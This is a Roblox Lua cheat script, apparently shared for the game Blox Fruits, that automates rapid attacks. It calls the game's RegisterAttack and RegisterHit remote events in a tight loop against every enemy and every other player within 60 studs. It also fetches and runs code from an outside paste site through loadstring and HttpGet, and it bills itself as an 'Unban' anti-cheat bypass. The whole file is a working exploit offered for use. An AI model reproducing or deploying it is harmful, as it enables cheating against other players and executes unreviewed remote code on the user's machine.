-- // [[ Nat Aov Hub Fast Attack Blox Fruits VIP ]] \\
-- || This File Created By Nguyễn Anh Tuấn ||


--// Unban Fast Attack 

local RS = game.ReplicatedStorage
local N = require(RS.Modules.Net)
local C = require(RS.Modules.CombatUtil)
local P = game.Players.LocalPlayer

local hit = N:RemoteEvent("RegisterHit", true)
local atk = RS.Modules.Net["RE/RegisterAttack"]

task.spawn(function()
    while task.wait() do
        local c = P.Character
        if not c then continue end

        local r = c:FindFirstChild("HumanoidRootPart")
        local t = c:FindFirstChildOfClass("Tool")
        if not (r and t) then continue end

        local id = tostring(P.UserId):sub(2, 4) .. tostring(coroutine.running()):sub(11, 15)
        local didy = false

        -- Enemies
        for _, m in ipairs(workspace.Enemies:GetChildren()) do
            local h = m:FindFirstChild("HumanoidRootPart")
            local u = m:FindFirstChild("Humanoid")

            if h and u and u.Health > 0 and (h.Position - r.Position).Magnitude <= 60 then
                if not didy then
                    atk:FireServer()
                    didy = true
                end

                hit:FireServer(h, { {m, h} }, nil, nil, id)
            end
        end

        -- Players
        for _, plr in ipairs(game.Players:GetPlayers()) do
            if plr ~= P and plr.Character then
                local m = plr.Character
                local h = m:FindFirstChild("HumanoidRootPart")
                local u = m:FindFirstChild("Humanoid")

                if h and u and u.Health > 0 and (h.Position - r.Position).Magnitude <= 60 then
                    if not didy then
                        atk:FireServer()
                        didy = true
                    end

                    hit:FireServer(h, { {m, h} }, nil, nil, id)
                end
            end
        end
    end
end)

--// Fast Attack Main

_G.AttackM = true
_G.AttackP = true
_G.Animation = false

local Load = loadstring(game:HttpGet("https://pastefy.app/zGvNP4d1/raw"))()

task.spawn(function()
    while task.wait(0.03) do
        Load:Attack()
    end
end)